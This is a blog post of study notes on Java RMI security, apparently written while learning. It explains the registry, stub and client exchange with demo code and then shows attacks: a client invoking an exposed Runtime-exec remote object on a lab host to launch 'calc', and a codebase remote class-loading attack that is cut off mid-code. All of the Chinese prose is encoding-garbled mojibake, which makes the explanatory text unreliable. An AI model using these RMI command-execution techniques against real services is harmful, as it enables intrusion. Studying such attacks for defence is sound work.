        <content type="html"><![CDATA[<h1 id="åŸæœ¬æ˜¯æ‰“ç®—åœ¨æ”¾å‡çš„ä½¿ç”¨å­¦javaçš„ä½†æ˜¯javaå†…å®¹å¤ªå¤æ‚äº†è¿˜æœ‰æˆ‘å¤ªæ‡’äº†ï¼Œæ”¾å‡é¢“åºŸäº†ä¸€ä¸ªæš‘å‡ï¼Œè¿™æ‰ä¸€ç›´åˆ°å¼€å­¦æ‰å¹¡ç„¶é†’æ‚Ÿï¼Œä½†æ˜¯è¯¥è¯´ä¸è¯´åœ¨ä¸Šè¯¾çš„æ—¶å€™æ¥å­¦Javaæ•ˆç‡æ¯”åœ¨å®¶é‡Œé«˜å¤šäº†å˜¿å˜¿"><a href="#åŸæœ¬æ˜¯æ‰“ç®—åœ¨æ”¾å‡çš„ä½¿ç”¨å­¦javaçš„ä½†æ˜¯javaå†…å®¹å¤ªå¤æ‚äº†è¿˜æœ‰æˆ‘å¤ªæ‡’äº†ï¼Œæ”¾å‡é¢“åºŸäº†ä¸€ä¸ªæš‘å‡ï¼Œè¿™æ‰ä¸€ç›´åˆ°å¼€å­¦æ‰å¹¡ç„¶é†’æ‚Ÿï¼Œä½†æ˜¯è¯¥è¯´ä¸è¯´åœ¨ä¸Šè¯¾çš„æ—¶å€™æ¥å­¦Javaæ•ˆç‡æ¯”åœ¨å®¶é‡Œé«˜å¤šäº†å˜¿å˜¿" class="headerlink" title="åŸæœ¬æ˜¯æ‰“ç®—åœ¨æ”¾å‡çš„ä½¿ç”¨å­¦javaçš„ä½†æ˜¯javaå†…å®¹å¤ªå¤æ‚äº†è¿˜æœ‰æˆ‘å¤ªæ‡’äº†ï¼Œæ”¾å‡é¢“åºŸäº†ä¸€ä¸ªæš‘å‡ï¼Œè¿™æ‰ä¸€ç›´åˆ°å¼€å­¦æ‰å¹¡ç„¶é†’æ‚Ÿï¼Œä½†æ˜¯è¯¥è¯´ä¸è¯´åœ¨ä¸Šè¯¾çš„æ—¶å€™æ¥å­¦Javaæ•ˆç‡æ¯”åœ¨å®¶é‡Œé«˜å¤šäº†å˜¿å˜¿"></a>åŸæœ¬æ˜¯æ‰“ç®—åœ¨æ”¾å‡çš„ä½¿ç”¨å­¦javaçš„ä½†æ˜¯javaå†…å®¹å¤ªå¤æ‚äº†è¿˜æœ‰æˆ‘å¤ªæ‡’äº†ï¼Œæ”¾å‡é¢“åºŸäº†ä¸€ä¸ªæš‘å‡ï¼Œè¿™æ‰ä¸€ç›´åˆ°å¼€å­¦æ‰å¹¡ç„¶é†’æ‚Ÿï¼Œä½†æ˜¯è¯¥è¯´ä¸è¯´åœ¨ä¸Šè¯¾çš„æ—¶å€™æ¥å­¦Javaæ•ˆç‡æ¯”åœ¨å®¶é‡Œé«˜å¤šäº†å˜¿å˜¿</h1><h1 id="æœ¬é—®å­¦ä¹ ä¸pç‰›çš„javaå®‰å…¨æ¼«è°ˆä¸GitHubä¸Šçš„é¡¹ç›®javasec"><a href="#æœ¬é—®å­¦ä¹ ä¸pç‰›çš„javaå®‰å…¨æ¼«è°ˆä¸GitHubä¸Šçš„é¡¹ç›®javasec" class="headerlink" title="æœ¬é—®å­¦ä¹ ä¸pç‰›çš„javaå®‰å…¨æ¼«è°ˆä¸GitHubä¸Šçš„é¡¹ç›®javasec"></a>æœ¬é—®å­¦ä¹ ä¸pç‰›çš„javaå®‰å…¨æ¼«è°ˆä¸GitHubä¸Šçš„é¡¹ç›®javasec</h1><h1 id="ä»€ä¹ˆæ˜¯RMI"><a href="#ä»€ä¹ˆæ˜¯RMI" class="headerlink" title="ä»€ä¹ˆæ˜¯RMI"></a>ä»€ä¹ˆæ˜¯RMI</h1><p>æ‰€è°“çš„RMIå…¶å®æ˜¯javaçš„ä¸€ç§è¿œç¨‹å¯¼å…¥åº“çš„ä¸€ç§æ–¹å¼,å…¶æ˜¯ç”±Registry,Sever è¿˜æœ‰Clientç»„æˆ<br><img src="/2024/09/07/RMI/2.png" class="" title="alt text"><br><img src="/2024/09/07/RMI/3.png" class="" title="alt text"><br>é€šè¿‡å›¾æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥å…¶äº¤äº’è¿‡ç¨‹ä¸º,Serveråˆ›å»ºè¿œç¨‹å¯¹è±¡è€Œåç»„æˆRegisry,Clienté€šè¿‡Regisryæ¥æŸ¥è¯¢è‡ªå·±è¦è·å–çš„å¯¹è±¡ã€‚è€ŒåRegitryæ¥æ”¾å›è¿œç¨‹è°ƒç”¨å¯¹è±¡çš„å­˜æ ¹ï¼Œè€Œåstubä¸skeletonè¿›è¡Œäº¤äº’ï¼Œè€Œskeletonä¸è¿œç¨‹å¯¹è±¡è¿›è¡Œäº¤äº’</p><p>ä½†æ˜¯ç»è¿‡æŸ¥é˜…javaæ—©åœ¨Java 2 SDK 1.2æ˜¯å°±å·²ç»ä¸ä½¿ç”¨skeletonäº†ï¼Œè€Œstubä¹Ÿä¸éœ€è¦ç”¨æˆ·æ‰‹åŠ¨å®šä¹‰ï¼Œæ‰€ä»¥çœŸæ­£çš„äº¤äº’åº”è¯¥æ˜¯stubå’Œè¿œç¨‹å¯¹è±¡è¿›è¡Œäº¤äº’ã€‚</p><p>RMIçš„æœåŠ¡çš„åˆ†ä¸ºæ¥å£ï¼Œè¿œç¨‹å¯¹è±¡å’Œæ³¨å†Œè¡¨<br>æˆ‘ä»¬ä½¿ç”¨ä»£ç æ¥å¯¹RMIè¿›è¡Œç†è§£<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ¥å£-&gt;RMIHello.java</span></span><br><span class="line"><span class="keyword">package</span> org.LSE;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIHello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Hello</span><span class="params">(String c)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å®ç°æ¥å£-&gt;Server.java</span></span><br><span class="line"><span class="keyword">package</span> org.LSE;</span><br><span class="line"><span class="keyword">import</span> java.rmi.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="comment">//åˆ›å»ºè¿œç¨‹å¯¹è±¡ç±»çš„æ¥å£</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LSEHello</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RMIHello</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">LSEHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();<span class="comment">//è°ƒç”¨UnicastRemoteObjectçš„æ„é€ å‡½æ•°</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">Hello</span><span class="params">(String c)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hello&quot;</span>+c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="comment">//å®Œæˆæ¥å£</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Registry.java</span></span><br><span class="line"><span class="keyword">package</span> org.LSE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Registry</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1007</span>);</span><br><span class="line">        <span class="type">Server</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Server</span>();</span><br><span class="line">        Server.LSEHello hello=ser.<span class="keyword">new</span> <span class="title class_">LSEHello</span>();</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1007/Hello&quot;</span>, hello);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">start</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Registry</span>();</span><br><span class="line">        start.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>Clinetç«¯éœ€è¦ä¸€ä¸ªå’ŒServerç«¯ä¸€æ¨¡ä¸€æ ·çš„æ¥å£<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RMIHello.java</span></span><br><span class="line"><span class="keyword">package</span> org.LSE;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIHello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Hello</span><span class="params">(String c)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Client.java</span></span><br><span class="line"><span class="keyword">package</span> org.LSE;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1007);</span></span><br><span class="line">        <span class="comment">// æŸ¥æ‰¾è¿œç¨‹å¯¹è±¡</span></span><br><span class="line">        <span class="type">RMIHello</span> <span class="variable">hello</span> <span class="operator">=</span> (RMIHello) Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1007/Hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è°ƒç”¨è¿œç¨‹æ–¹æ³•</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">response</span> <span class="operator">=</span> hello.Hello(<span class="string">&quot;World&quot;</span>);</span><br><span class="line">        System.out.println(response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æ³¨æ„å…¶æ¥å£çš„åŒ…åä¹Ÿéœ€ä¸Serveræ¥å£åŒ…åç›¸åŒ<br>å½“ç„¶ç”ŸæˆæŒ‚è½½ç±»å’Œè°ƒç”¨ç±»çš„æ–¹æ³•å¾ˆå¤šå¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Sever</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">registry</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Registry r=LocateRegistry.createRegistry(<span class="number">1007</span>);</span><br><span class="line">        <span class="type">Server</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Server</span>();</span><br><span class="line">        Server.LSEHello hello=ser.<span class="keyword">new</span> <span class="title class_">LSEHello</span>();</span><br><span class="line">        r.rebind(<span class="string">&quot;rmi://127.0.0.1:1007/Hello&quot;</span>, hello);</span><br><span class="line">        <span class="comment">//Naming.rebind(&quot;rmi://127.0.0.1:1007/Hello&quot;, hello);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">registry</span> <span class="variable">start</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">registry</span>();</span><br><span class="line">        start.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Client</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">r</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1007</span>);</span><br><span class="line">        <span class="type">RMIHello</span> <span class="variable">hello</span> <span class="operator">=</span> (RMIHello) r.lookup(<span class="string">&quot;rmi://127.0.0.1:1007/Hello&quot;</span>);</span><br><span class="line">        <span class="comment">// æŸ¥æ‰¾è¿œç¨‹å¯¹è±¡</span></span><br><span class="line">        <span class="comment">//RMIHello hello = (RMIHello) Naming.lookup(&quot;rmi://127.0.0.1:1007/Hello&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// è°ƒç”¨è¿œç¨‹æ–¹æ³•</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">response</span> <span class="operator">=</span> hello.Hello(<span class="string">&quot;World&quot;</span>);</span><br><span class="line">        System.out.println(response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¦æƒ³åˆ†æRMIçš„è¿‡ç¨‹æˆ‘ä»¬éœ€è¦å¯¹è¿™ä¸ªé€šä¿¡è¿‡ç¨‹è¿›è¡ŒæŠ“åŒ…ã€‚<br>æŠ“åˆ°åŒ…åæˆ‘ä»¬å‘ç°å…¶è¿›è¡Œäº†å¦‚ä¸‹å›¾çš„ä¸¤æ¬¡tcpçš„æ¡æ‰‹<br><img src="/2024/09/07/RMI/5.png" class="" title="alt text"><br>ç¬¬ä¸€æ¬¡çš„tcpæˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥æ˜¯å®¢æˆ·ç«¯å‘è¿œç«¯çš„1007ç«¯å£å³registryå‘é€è¯·æ±‚ï¼Œä¹‹åè¿œç«¯æ”¾å›å“åº”ã€‚</p><p>ç¬¬äºŒæ¬¡tcpæ¡æ‰‹æˆ‘ä»¬ä¼šå‘ç°å…¶å‘è¿œç«¯çš„14956ç«¯å£å‘é€äº†è¯·æ±‚ï¼Œé‚£ä¹ˆç°åœ¨å°±æœ‰ä¸€ä¸ªé—®é¢˜äº†ï¼Œå®¢æˆ·ç«¯æ˜¯æ€ä¹ˆçŸ¥é“14956è¿™ä¸ªç«¯å£çš„ã€‚æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹æµé‡ä¼šå‘ç°å…¶åœ¨ç¬¬ä¸€æ¬¡æ¡æ‰‹åå®¢æˆ·ç«¯å‘è¿œç«¯å‘é€äº†ä¸€ä¸ªâ€callâ€æ¶ˆæ¯ï¼Œè€Œè¿œç«¯è¿”å›äº†ä¸€ä¸ªâ€ReturnDataâ€è¿”å›çš„DATAå“åº”åŒ…å¦‚ä¸‹<br><img src="/2024/09/07/RMI/6.png" class="" title="alt text"><br>ä¼šå‘ç°å…¶æ˜¯ä¸€ä¸ªåºåˆ—åŒ–åçš„å“åº”åŒ…è€Œåœ¨ipåçš„\x00\x00\x3a\x6cå…¶å®æ˜¯ç«¯å£14956çš„ç½‘ç»œåºåˆ—<br><img src="/2024/09/07/RMI/7.png" class="" title="alt text"></p><p>è¿™ä¸ªçš„æ•´ä½“è¿‡ç¨‹å°±æ˜¯ï¼Œå®¢æˆ·ç«¯å…ˆä¸è¿œç«¯çš„Registryè¿›è¡Œè¿æ¥è€Œåå‘Registryå‘é€è¯·æ±‚å¯»æ‰¾nameä¸ºHelloè¿™ä¸ªå¯¹è±¡ï¼ŒRegistryè¿”å›ä¸€ä¸ªDATAè¿™ä¸ªDATAå°±æ˜¯è¿™ä¸ªHelloè¿™ä¸ªè¿œç¨‹å¯¹è±¡çš„ä¸€ä¸ªå¼•ç”¨(stub)ï¼Œå®¢æˆ·ç«¯ååºåˆ—åŒ–åå‘ç°è¯¥æ•°æ®æ˜¯è¿œç¨‹å¯¹è±¡çš„å­˜æ ¹ï¼Œè¯¥å­˜æ ¹å¯¹è±¡å†…å­˜å‚¨çš„è¿œç¨‹å¯¹è±¡çš„ipå’Œç«¯å£ç­‰ï¼Œäºæ˜¯å®¢æˆ·ç«¯å†æ¬¡ä¸è¿œç¨‹å¯¹è±¡è¿æ¥æ¥çš„è°ƒç”¨è¿œç¨‹å¯¹è±¡Helloï¼Œå³å¯¹è±¡çš„è°ƒç”¨æ˜¯å‘ç”Ÿåœ¨ç¬¬äºŒæ¬¡tcpè¿æ¥çš„ã€‚<br>å¹¶ä¸”å…¶å®è¿œç¨‹æ–¹æ³•å…¶å®æ˜¯åœ¨RMI Serverä¸Šæ‰§è¡Œçš„</p><h1 id="RMIçš„ä¸€äº›æ”»å‡»æ‰‹æ®µ"><a href="#RMIçš„ä¸€äº›æ”»å‡»æ‰‹æ®µ" class="headerlink" title="RMIçš„ä¸€äº›æ”»å‡»æ‰‹æ®µ"></a>RMIçš„ä¸€äº›æ”»å‡»æ‰‹æ®µ</h1><h2 id="RMIæœåŠ¡å™¨æŒ‚è½½äº†ä¸€äº›å±é™©æ–¹æ³•"><a href="#RMIæœåŠ¡å™¨æŒ‚è½½äº†ä¸€äº›å±é™©æ–¹æ³•" class="headerlink" title="RMIæœåŠ¡å™¨æŒ‚è½½äº†ä¸€äº›å±é™©æ–¹æ³•"></a>RMIæœåŠ¡å™¨æŒ‚è½½äº†ä¸€äº›å±é™©æ–¹æ³•</h2><p>é¦–å…ˆæˆ‘ä»¬å¯ä»¥æŠŠRegistryæƒ³è±¡æˆä¸€ä¸ªç®¡ç†è¿œç¨‹å¯¹è±¡çš„ä¸€ä¸ªåå°ï¼Œå³æˆ‘ä»¬çŸ¥é“äº†Registryå°±å¯ä»¥å¯¹è¿œç¨‹å¯¹è±¡è¿›è¡Œä¸€äº›è°ƒç”¨ï¼Œä½†æ˜¯å¾ˆå¯æƒœæˆ‘ä»¬æ— æ³•ä¿®æ”¹Registryä¸Šçš„ç±»ï¼Œjavaåœ¨æˆ‘ä»¬ä½¿ç”¨Naming.rebindçš„æ—¶å€™ä¼šåˆ¤æ–­æˆ‘ä»¬æ˜¯å¦æ˜¯localhostçš„åªæœ‰localhostæ‰å¯ä»¥ä¿®æ”¹Registryä¸ŠæŒ‚è½½çš„ç±»ã€‚<br>æˆ‘ä»¬è™½ç„¶æ— æ³•ä¿®æ”¹ç±»ï¼Œä½†å´å¯ä»¥è°ƒç”¨ç±»ï¼Œä½¿ç”¨Naming.listæ¥æŸ¥çœ‹å…¶æ˜¯å¦å­˜åœ¨å±é™©ç±»ï¼Œè‹¥å­˜åœ¨æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œè€Œè°ƒç”¨çš„è¿œç¨‹å¯¹è±¡å…¶å®æ˜¯åœ¨è¿œç«¯æœåŠ¡å™¨ä¸Šè¿è¡Œçš„ã€‚</p><p>æˆ‘ä»¬åœ¨RegistryåŠ ä¸Šä¸€ä¸ªRuntimeçš„æ¶æ„ç±»<br><img src="/2024/09/07/RMI/9.png" class="" title="alt text"><br><img src="/2024/09/07/RMI/8.png" class="" title="alt text"><br>ç”¨listå¯ä»¥çœ‹åˆ°è¿™ä¸ªRunç±»<br>åœ¨è™šæ‹Ÿæœºä¸­è¿è¡Œ<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        LocateRegistry.getRegistry(<span class="string">&quot;192.168.20.1&quot;</span>,<span class="number">1007</span>);</span><br><span class="line">        runtime Run=(runtime) Naming.lookup(<span class="string">&quot;rmi://192.168.20.1:1007/Run&quot;</span>);</span><br><span class="line">        Run.run(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ä¼šå‘ç°å¼¹å‡ºè®¡ç®—æœº<br><img src="/2024/09/07/RMI/11.png" class="" title="alt text"></p><h2 id="ä½¿ç”¨codebaseæ”»å‡»"><a href="#ä½¿ç”¨codebaseæ”»å‡»" class="headerlink" title="ä½¿ç”¨codebaseæ”»å‡»"></a>ä½¿ç”¨codebaseæ”»å‡»</h2><p>åœ¨RMIä¸­å­˜åœ¨è¿™è¿œç¨‹åŠ è½½ç±»çš„åœºæ™¯ï¼Œå…¶ä¸­æ¶‰åŠåˆ°äº†codebaseã€‚<br>å½“æœåŠ¡å™¨å®‰è£…å¹¶é…ç½®äº†SecurityManageræ—¶æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨codebase<br>codebaseæ˜¯ä¸€ä¸ªurlåœ°å€ï¼Œè¯¥åœ°å€åŒ…å«äº†ä¸€ä¸ªjavaçš„ç±»æ–‡ä»¶ï¼Œå½“codebaseä¼ åˆ°RegistryæœåŠ¡å™¨æ—¶ï¼ŒæœåŠ¡å™¨ä¼šå…ˆæœç´¢çœ‹è‡ªå·±æ˜¯å¦æœ‰è¿™ä¸ªç±»æ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰å°±è°ƒç”¨è¿™ä¸ªè¿œç¨‹çš„codebaseçš„ç±»æ–‡ä»¶ã€‚<br>é‚£ä¹ˆåªè¦æˆ‘ä»¬èƒ½å¤Ÿæ“æ§codebaseè®©å…¶åŠ è½½æ¶æ„ç±»æ–‡ä»¶ä¸å°±å¯ä»¥å‘½ä»¤æ‰§è¡Œäº†ã€‚</p><p>å½“ç„¶äº†åƒè¿™ç§æ˜æ˜¾çš„æ¼æ´å®˜æ–¹è‡ªç„¶æ˜¯çŸ¥é“çš„ï¼Œäºæ˜¯å®˜æ–¹åœ¨javaç‰ˆæœ¬7u21ã€6u45ä¹‹åæŠŠjava.rmi.server.useCodebaseOnlyçš„é»˜è®¤é…ç½®ç”±æ”¹ä¸ºäº†trueã€‚è€Œå½“java.rmi.server.useCodebaseOnly=trueæ—¶è¿œç¨‹çš„RMIæœåŠ¡ä¹‹åæ‰§è¡Œå·²ç»é¢„è®¾å®šå¥½çš„codebaseçš„ç±»ï¼Œè‹¥codebaseçš„ç±»ä¸æ˜¯é¢„è®¾çš„å°±ä¼šæŠ¥é”™ã€‚</p><p>è€Œjava.rmi.server.useCodebaseOnly=falseæ—¶å°±å­˜åœ¨è¿™ä¸ªæ¼æ´ã€‚<br>å³å½“javaç‰ˆæœ¬ä½äº7u21ã€6u45æˆ–è€…java.rmi.server.useCodebaseOnly=falseæ—¶æˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨codebaseè¿›è¡Œæ”»å‡»</p><p>ä»£ç å¦‚ä¸‹<br>é¦–å…ˆæ˜¯Server<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RemoteRMIServer.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;setup SecurityManager&quot;</span>);</span><br><span class="line">            System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">SecurityManager</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Calc</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calc</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://192.168.20.1:1099/refObj&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RemoteRMIServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Calc.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> 